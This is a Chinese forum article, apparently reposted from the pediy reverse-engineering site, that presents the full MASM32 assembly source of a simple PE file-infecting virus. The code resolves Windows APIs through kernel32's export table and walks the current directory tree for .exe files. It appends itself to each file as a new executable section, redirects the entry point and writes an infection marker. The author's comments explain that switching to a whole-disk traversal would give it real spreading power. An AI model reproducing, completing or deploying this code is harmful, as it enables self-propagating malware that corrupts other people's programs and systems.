
# 一个简单的 PE 病毒外壳

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-646.htm`](https://www.pediy.com/kssd/pediy09/pediy09-646.htm)

```assembly
;主要集成了 Win32.poly.ShowTime2，老罗的向 PE 文件中添加新节的办法  
;编译的时候在 LINK 选项中要加上：/section:.rew 使代码段可写  
;编译器为 MASM32  
;EnumDir 部分自己写的，功能为遍历当前目录以及子目录，故基本没有传染功能，如果改成全盘遍历就可以了  
;没填加对加壳文件的识别，感染后运行会出错  
;写的比较简单，而且复制的代码一部分有人注释过了，就不做详细注释了  

.386  
.Model Flat, StdCall  
Option Casemap :None  
Include windows.inc  

_GetKernelBase proto :DWORD  
_GetApi proto :DWORD ,:DWORD ,:DWORD  
AddNewSection proto :DWORD  

.CODE  
APPEND_CODE equ this BYTE  

Virus:  
  buffer db 1024 dup (0)  
  hKernel32 DD 0  
  _GetProcAddress dd 0  
  nGetProcAddress db 'GetProcAddress',13,10,0  
  nLoadLibraryA   db 'LoadLibraryA',0  
  _LoadLibraryA   dd 0  
  nKernel db 'kernel32.dll',0  
  cdw     dd 0  

VStart:  
  call  @F  
  @@:  
  pop   ebx  
  sub   ebx,offset @B  
  invoke  _GetKernelBase,[esp]  
  mov hKernel32[ebx],eax  
  lea eax,[offset nGetProcAddress+ebx]  
  invoke _GetApi,[offset hKernel32+ebx],eax,14  
  mov _GetProcAddress[ebx],eax  
  lea eax,[offset nLoadLibraryA+ebx]  
  invoke _GetApi,[offset hKernel32+ebx],eax,12  
  mov _LoadLibraryA[ebx],eax  
  lea eax,[offset nKernel+ebx]  
  push eax  
  call _LoadLibraryA[ebx]  
  mov DWORD ptr hKernel32[ebx],eax  
  call GetOApiz  
  lea eax,[offset buffer+ebx]  
  push eax  
  push 128  
  call _GetCurrentDirectory[ebx]  
  lea eax,[offset buffer+ebx]  
  push eax  
  call EnumDir  
  jmp   en   ;跳转到原入口点  

GetOApiz:  
  call @api_table        ;下面数组的首地址入栈  
  db 'CreateThread',0  
  db 'CreateRemoteThread',0  
  db 'WinExec',0  
  db 'CreateMutexA',0  
  db 'OpenMutexA',0  
  db 'ReleaseMutex',0  
  db 'FindFirstFileA',0  
  db 'FindNextFileA',0  
  db 'FindClose',0  
  db 'CreateFileA',0  
  db 'CreateFileMappingA',0  
  db 'MapViewOfFile',0  
  db 'UnmapViewOfFile',0  
  db 'SetFilePointer',0  
  db 'ReadFile',0  
  db 'WriteFile',0  
  db 'CloseHandle',0  
  db 'VirtualAlloc',0  
  db 'VirtualAllocEx',0  
  db 'WriteProcessMemory',0  
  db 'VirtualFree',0  
  db 'VirtualFreeEx',0  
  db 'lstrcmpi',0  
  db 'lstrcpy',0  
  db 'lstrcat',0  
  db 'lstrlen',0  
  db 'GetFileSize',0  
  db 'GetSystemDirectoryA',0  
  db 'GetModuleFileNameA',0  
  db 'Sleep',0  
  db 'GetSystemTime',0  
  db 'DeleteFileA',0  
  db 'OpenProcess',0  
  db 'GetModuleHandleA',0  
  db 'GetCurrentDirectoryA',0  
  db 'SetCurrentDirectoryA',0  
  db 'ExitProcess',0  
  db 'GetExitCodeThread',0  
  db 'ResumeThread',0  
  db 'GlobalAlloc',0  
  db 'GlobalFree',0  
  db 'RtlMoveMemory',0  
  db 'SetEndOfFile',0  

@api_table:  
  pop edi  
  call @api_dest        ;原理同上  

K_Apiz:  
  _CreateThread  dd 0  
  _CreateRemoteThread  dd 0  
  _WinExec  dd 0  
  _CreateMutex  dd 0  
  _OpenMutex  dd 0  
  _ReleaseMutex  dd 0  
  _FindFirstFile  dd 0  
  _FindNextFile  dd 0  
  _FindClose  dd 0  
  _CreateFile  dd 0  
  _CreateFileMapping  dd 0  
  _MapViewOfFile  dd 0  
  _UnmapViewOfFile  dd 0  
  _SetFilePointer  dd 0  
  _ReadFile  dd 0  
  _WriteFile  dd 0  
  _CloseHandle  dd 0  
  _VirtualAlloc  dd 0  
  _VirtualAllocEx  dd 0  
  _WriteProcessMemory  dd 0  
  _VirtualFree  dd 0  
  _VirtualFreeEx  dd 0  
  _lstrcmpi  dd 0  
  _lstrcpy  dd 0  
  _lstrcat dd 0  
  _lstrlen  dd 0  
  _GetFileSize  dd 0  
  _GetSystemDirectory  dd 0  
  _GetModuleFileName  dd 0  
  _Sleep  dd 0  
  _GetSystemTime  dd 0  
  _DeleteFile  dd 0  
  _OpenProcess  dd 0  
  _GetModuleHandle  dd 0  
  _GetCurrentDirectory  dd 0  
  _SetCurrentDirectory  dd 0  
  _ExitProcess  dd 0  
  _GetExitCodeThread  dd 0  
  _ResumeThread  dd 0  
  _GlobalAlloc  dd 0  
  _GlobalFree    dd 0  
  _RtlMoveMemory  dd 0  
  _SetEndOfFile  dd 0  

  K_API_NUM=($-K_Apiz)/4  

@api_dest:  
  pop esi  
  push K_API_NUM  
  pop ecx  
  xor ebp,ebp  

K_begin:  
  push ecx  ;loop 循环 计数  
  push edi  
  push hKernel32[ebx]  
  call _GetProcAddress[ebx] ;获取 api 地址  
  or eax,eax  
  jz GA_Fail  
  mov DWORD ptr [esi],eax  ;eax 中的函数地址存入 K_Apiz 的数组中  

GA_Fail:  
  add esi,4  
  xor eax,eax  
  repnz scasb  
  pop ecx  
  loop K_begin  

call szUser32   ;下面的首地址入栈  
  db 'User32.dll',0    
  szFindWindowA db "FindWindowA",0  
  szFindWindowExA db "FindWindowExA",0  
  szSendMessageA db "SendMessageA",0  
  szChildWindowFromPointEx db "ChildWindowFromPointEx",0  
  _FindWindowA dd 0  
  _FindWindowExA dd 0  
  _SendMessageA dd 0  
  _ChildWindowFromPointEx dd 0  

szUser32:  
  call _LoadLibraryA[ebx]  ;user32.dll  
  push esi             ;???????  保存 esi?  
  mov esi,eax  
  call szwsprintfA       ;push  
    db 'wsprintfA',0  
    _wsprintf dd 0  

szwsprintfA:  
  push esi  
  call _GetProcAddress[ebx] ;get wsprintf  
  mov DWORD ptr _wsprintf[ebx],eax  

  lea ecx,[offset szFindWindowA+ebx]  
  push ecx  
  push esi            ;user32.dll  
  call _GetProcAddress[ebx]  
  mov DWORD ptr _FindWindowA[ebx],eax  

  lea ecx,[offset szFindWindowExA+ebx]  
  push ecx  
  push esi  
  call _GetProcAddress[ebx]  
  mov DWORD ptr _FindWindowExA[ebx],eax  

  lea ecx,[offset szSendMessageA+ebx]  
  push ecx  
  push esi  
  call _GetProcAddress[ebx]  
  mov DWORD ptr _SendMessageA[ebx],eax  

  lea ecx,[offset szChildWindowFromPointEx+ebx]  
  push ecx  
  push esi  
  call _GetProcAddress[ebx]  
  mov DWORD ptr _ChildWindowFromPointEx[ebx],eax  

  pop esi  
  ret  

_GetKernelBase  proc  _dwKernelRet  
    local  @dwReturn  
    pushad  
    mov  @dwReturn,0  

;********************************************************************  
; 重定位  
;********************************************************************  
    call  @F  
    @@:  
    pop  ebx  
    sub  ebx,offset @B  

;********************************************************************  
; 查找 Kernel32.dll 的基地址  
;********************************************************************  
    mov  edi,_dwKernelRet  
    and  edi,0ffff0000h  

    .while  TRUE  
      .if  WORD  ptr [edi] == IMAGE_DOS_SIGNATURE  
        mov  esi,edi  
        add  esi,[esi+003ch]  
        .if WORD  ptr [esi] == IMAGE_NT_SIGNATURE  
          mov  @dwReturn,edi  
          .break  
        .endif  
      .endif  
      sub  edi,010000h  
      .break  .if edi < 070000000h  
    .endw  

    popad  
    mov  eax,@dwReturn  
    ret  

_GetKernelBase  endp  

_GetApi  proc  _hModule,_lpszApi,_cnt  
    local  @dwReturn,@dwStringLength  
    pushad  
    mov  @dwReturn,0  

;********************************************************************  
; 重定位  
;********************************************************************  
    call  @F  
    @@:  
    pop  ebx  
    sub  ebx,offset @B  
```



`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`; 计算 API 字符串的长度（带尾部的 0）`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`mov ecx,_cnt`

`mov @dwStringLength,ecx`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`; 从 PE 文件头的数据目录获取导出表地址`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`mov esi,_hModule`

`add esi,[esi + 3ch]`

`assume esi:ptr IMAGE_NT_HEADERS`

`mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress`

`add esi,_hModule`

`assume esi:ptr IMAGE_EXPORT_DIRECTORY`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`; 查找符合名称的导出函数名`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`mov ebx,[esi].AddressOfNames`

`add ebx,_hModule`

`xor edx,edx`

`.repeat`

`push esi`

`mov edi,[ebx]`

`add edi,_hModule`

`mov esi,_lpszApi`

`mov ecx,@dwStringLength`

`repz cmpsb`

`.if ZERO?`

`pop esi`

`jmp @F`

`.endif`

`pop esi`

`add ebx,4`

`inc edx`

`.until edx >= [esi].NumberOfNames`

`jmp _Error`

`@@:`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`; API 名称索引 --> 序号索引 --> 地址索引`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`sub ebx,[esi].AddressOfNames`

`sub ebx,_hModule`

`shr ebx,1`

`add ebx,[esi].AddressOfNameOrdinals`

`add ebx,_hModule`

`movzx eax,WORD ptr [ebx]`

`shl eax,2`

`add eax,[esi].AddressOfFunctions`

`add eax,_hModule`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`; 从地址表得到导出函数地址`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`mov eax,[eax]`

`add eax,_hModule`

`mov @dwReturn,eax`

`_Error:`

`popad`

`mov eax,@dwReturn`

`ret`

`_GetApi    endp`

`allfile db '.*',0`

`nextdir db '\',0`

`wfd WIN32_FIND_DATA <0>`

`ext db '.exe',0`

`self db 'GUI.exe',0`

`EnumDir PROC DirName : DWORD`

`local hSearch:DWORD`

`local DirorFile[128]:DWORD`

`pushad`

`push DirName`

`lea esi,DirorFile`

`push esi`

`call _lstrcpy[ebx]`

`push esi ;当前目录`

`call _SetCurrentDirectory[ebx]`

`lea edi,[offset wfd+ebx]`

`push edi`

`lea eax,[offset allfile+ebx]`

`push eax`

`call _FindFirstFile[ebx]`

`cmp eax,INVALID_HANDLE_VALUE`

`jz ED_Exit`

`mov hSearch,eax`

`.repeat`

`mov eax,DWORD ptr [offset wfd+ebx]`

`and eax,FILE_ATTRIBUTE_DIRECTORY`

`.if eax == FILE_ATTRIBUTE_DIRECTORY`

`.if BYTE ptr [wfd+44+ebx]!='.'`

`push DirName`

`lea esi,DirorFile`

`PUSH ESI ;esi 指向局部缓冲区`

`call _lstrcpy[ebx]`

`lea eax,[offset nextdir+ebx]`

`push eax`

`push esi`

`call _lstrcat[ebx]`

`lea eax,[offset wfd+44+ebx]`

`push eax`

`push esi`

`call _lstrcat[ebx]`

`push esi`

`call EnumDir`

`.endif`

`.else`

`.if BYTE ptr [wfd+44+ebx]!='.'`

`pushad`

`lea eax,[offset wfd.cFileName+ebx]`

`push eax`

`call _lstrlen[ebx]`

`sub eax,4`

`mov esi,esi ;esi=扩展名位置`

`lea edx,[offset ext+ebx]`

`push edx`

`lea eax,wfd.cFileName[esi]`

`add eax,ebx`

`push eax`

`call _lstrcmpi[ebx]`

`cmp eax,0`

`jnz j1`

`push DirName`

`lea esi,DirorFile`

`push esi`

`call _lstrcpy[ebx]`

`lea eax,[offset nextdir+ebx]`

`push eax`

`push esi`

`call _lstrcat[ebx]`

`lea eax,[offset wfd.cFileName+ebx]`

`lea edx,[offset self+ebx]`

`push eax`

`push edx`

`call _lstrcmpi[ebx]`

`cmp eax,0`

`jz j1`

`lea eax,[offset wfd.cFileName+ebx]`

`push eax`

`push esi`

`call _lstrcat[ebx]`

`push esi`

`call InfectFile`

`j1:`

`popad`

`.endif`

`.endif`

`push edi`

`push hSearch`

`call _FindNextFile[ebx]`

`.until eax == 0`

`ED_Close:`

`push hSearch`

`call _FindClose[ebx]`

`ED_Exit:`

`popad`

`ret 8`

`EnumDir endp`

`PE_Header IMAGE_NT_HEADERS <0>`

`My_Section IMAGE_SECTION_HEADER <>`

`Head_Len equ sizeof IMAGE_NT_HEADERS + sizeof IMAGE_SECTION_HEADER`

`Old_AddressOfEntryPoint dd 0`

`Old_ImageBase dd 0`

`InfectFile proc FileName`

`LOCAL hFile: HANDLE`

`LOCAL dwPE_Header_OffSet: DWORD`

`LOCAL dwFileReadWritten: DWORD`

`LOCAL dwMySectionOffSet: DWORD`

`LOCAL dwLastSection_SizeOfRawData: DWORD`

`LOCAL dwLastSection_PointerToRawData: DWORD`

`;打开文件：`

`pushad`

`push NULL`

`push FILE_ATTRIBUTE_NORMAL`

`push OPEN_EXISTING`

`push NULL`

`push FILE_SHARE_READ+FILE_SHARE_WRITE`

`push GENERIC_READ+GENERIC_WRITE`

`push FileName`

`call _CreateFile[ebx]`

`.if eax == INVALID_HANDLE_VALUE`

`jmp Err_CreateFile_Exit`

`.endif`

`mov hFile, eax`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`;读取 PE 文件头：`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`push FILE_BEGIN`

`push 0`

`push 3ch`

`push hFile`

`call _SetFilePointer[ebx]`

`push NULL`

`lea esi,dwFileReadWritten`

`push esi`

`push 4`

`lea edi,dwPE_Header_OffSet`

`push edi`

`push hFile`

`call _ReadFile[ebx]`

`push FILE_BEGIN`

`push 0`

`push dwPE_Header_OffSet`

`push hFile`

`call _SetFilePointer`

`push NULL`

`lea esi,dwFileReadWritten`

`push esi`

`push Head_Len`

`lea edi,[offset PE_Header+ebx]`

`push edi`

`push hFile`

`call _ReadFile`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`;判断是否有效的 PE 文件，是的话才继续：`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`

`lea esi,PE_Header`

`add esi,ebx`

`assume esi:ptr IMAGE_NT_HEADERS`

`.if [esi].Signature!= IMAGE_NT_SIGNATURE`

`;如果不是有效的 PE 文件，就给出提示：`

`jmp Exit`

`.endif`

`.if WORD ptr [esi+1ah] == 0888h ;感染标志`

`jmp Exit`

`.endif`

`;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*`



```asm
;判断是否有足够空间存储新节：
;****************************************************************
movzx eax, [esi].FileHeader.NumberOfSections ;得到添加新节前有多少个节：
mov ecx, 28h    ;28h = sizeof IMAGE_SECTION_HEADER
mul ecx         ;eax = NumberOfSections * sizeof IMAGE_SECTION_HEADER
add eax, dwPE_Header_Offset    ;eax = eax + PE 文件头偏移
add eax, 18h    ;18h = sizeof IMAGE_FILE_HEADER
movzx ecx, [esi].FileHeader.SizeOfOptionalHeader
add eax, ecx    ;eax = eax + sizeof IMAGE_OPTIONAL_HEADER
add eax, 28h    ;添加一个新节的大小
.if eax > [esi].OptionalHeader.SizeOfHeaders
      ;不够的话给出提示：
      jmp Exit
.endif

;****************************************************************
;保存原入口，后面要用到：
;****************************************************************
mov eax, [esi].OptionalHeader.AddressOfEntryPoint
mov Old_AddressOfEntryPoint[ebx], eax
mov eax, [esi].OptionalHeader.ImageBase
mov Old_ImageBase[ebx], eax

;****************************************************************
;计算新节的偏移地址：
;（其实跟上面的“判断是否有足够空间存储新节”基本上一样）
;****************************************************************
movzx eax, [esi].FileHeader.NumberOfSections
mov ecx, 28h
mul ecx          ;eax = NumberOfSections * sizeof IMAGE_SECTION_HEADER
add eax, 4h      ;4h = sizeof "PE\0\0"
add eax, dwPE_Header_Offset
add eax, sizeof IMAGE_FILE_HEADER
add eax, sizeof IMAGE_OPTIONAL_HEADER
mov dwMySectionOffset, eax    ;现在得到了我们的新节的偏移地址

;****************************************************************
;填充我们自己的节的信息：
;（这部分请查看 PE 格式，很容易明白，不多说了）
;****************************************************************
lea edi,My_Section
add edi,ebx
assume edi:ptr IMAGE_SECTION_HEADER
mov DWORD  ptr [edi].Name1, "CL."    ;名字就叫做“.LC”吧，呵呵……
mov [edi].Misc.VirtualSize,VirusLen
push [esi].OptionalHeader.SizeOfImage
pop [edi].VirtualAddress
mov eax, [edi].Misc.VirtualSize
mov ecx, [esi].OptionalHeader.FileAlignment
cdq
div ecx
inc eax
mul ecx
mov [edi].SizeOfRawData, eax  ;SizeOfRawData 在 EXE 文件中是对齐到 FileAlignMent 的整数倍的值
mov eax, dwMySectionOffset
sub eax, 18h    ;这个偏移是定位到最后一节的“SizeOfRawData”
push FILE_BEGIN
push 0
push eax
push hFile
call _SetFilePointer
  push NULL
  lea eax,dwFileReadWritten
  push eax
  push 4
  lea edx,dwLastSection_SizeOfRawData
  push edx
  push hFile
  call _ReadFile
  push NULL
  lea eax,dwFileReadWritten
  push eax
  push 4
  lea edx,dwLastSection_PointerToRawData
  push edx
  push hFile
  call _ReadFile
;每个节的 PointerToRawData 等于它的上一节的 SizeOfRawData + PointerToRawData：
mov eax, dwLastSection_SizeOfRawData
add eax, dwLastSection_PointerToRawData
mov [edi].PointerToRawData, eax
mov [edi].PointerToRelocations, 0h
mov [edi].PointerToLinenumbers, 0h
mov [edi].NumberOfRelocations, 0h
mov [edi].NumberOfRelocations, 0h
mov [edi].Characteristics, 0E0000020h    ;可读可写可执行

;****************************************************************
;重新写入 IMAGE_SECTION_HEADER：（包含了新节的信息）
;****************************************************************
push FILE_BEGIN
push 0
push dwMySectionOffset
push hFile
call _SetFilePointer
  push NULL
  lea eax,dwFileReadWritten
  push eax
  push sizeof IMAGE_SECTION_HEADER
  push edi
  push hFile
  call _WriteFile
;****************************************************************
;在文件的最后写入我们的新节：
;****************************************************************
push  FILE_END
push 0
push 0
push hFile
call _SetFilePointer

push 0
lea eax, dwFileReadWritten
push eax
push [edi].SizeOfRawData
lea eax, Virus
push eax
push hFile
call _WriteFile

;****************************************************************
;改写 IMAGE_NT_HEADERS，使新节可以首先执行：
;（需要改写 SizeOfImage 和 AddressOfEntryPoint）
;****************************************************************
inc [esi].FileHeader.NumberOfSections
mov eax, [edi].Misc.VirtualSize
mov ecx, [esi].OptionalHeader.SectionAlignment
cdq
div ecx
inc eax
mul ecx
add eax, [esi].OptionalHeader.SizeOfImage
mov [esi].OptionalHeader.SizeOfImage, eax    ;SizeOfImage 是一个对齐到 SectionAlignment 的整数倍的值
mov eax, [edi].VirtualAddress
add eax,(offset VStart-offset APPEND_CODE)
mov [esi].OptionalHeader.AddressOfEntryPoint, eax ;现在的 AddressOfEntryPoint 是指向新节的第一条指令
mov WORD ptr [esi+1ah],0888h  ;写入感染标志
push FILE_BEGIN
push 0
push dwPE_Header_Offset
push hFile
call _SetFilePointer

push NULL
lea eax,dwFileReadWritten
push eax
push sizeof IMAGE_NT_HEADERS
push esi
push hFile
call _WriteFile

;****************************************************************
;修正新代码中的 jmp OldEntry 指令
;****************************************************************
mov eax,[edi].VirtualAddress
add  eax,(offset _ToOldEntry-offset APPEND_CODE+5)
sub  Old_AddressOfEntryPoint[ebx],eax
mov  ecx,[edi].PointerToRawData
add  ecx,(offset _dwOldEntry-offset APPEND_CODE)
push FILE_BEGIN
push NULL
push ecx
push hFile
call _SetFilePointer
push NULL
lea eax,dwFileReadWritten
push eax
push 4
lea edx,[offset Old_AddressOfEntryPoint+ebx]
push edx
push hFile
call _WriteFile
Exit:
;关闭文件：
push hFile
call _CloseHandle
Err_CreateFile_Exit:
  popad
  ret
InfectFile endp
en:
_ToOldEntry:
  db  0e9h  ;0e9h 是 jmp xxxxxxxx 的机器吗
_dwOldEntry:
  dd  ?  ;用来填入原来的入口地址
VirusLen=$-offset Virus
APPEND_CODE_END  equ  this BYTE
 push 0
 call _ExitProcess[ebx]
END VStart
```
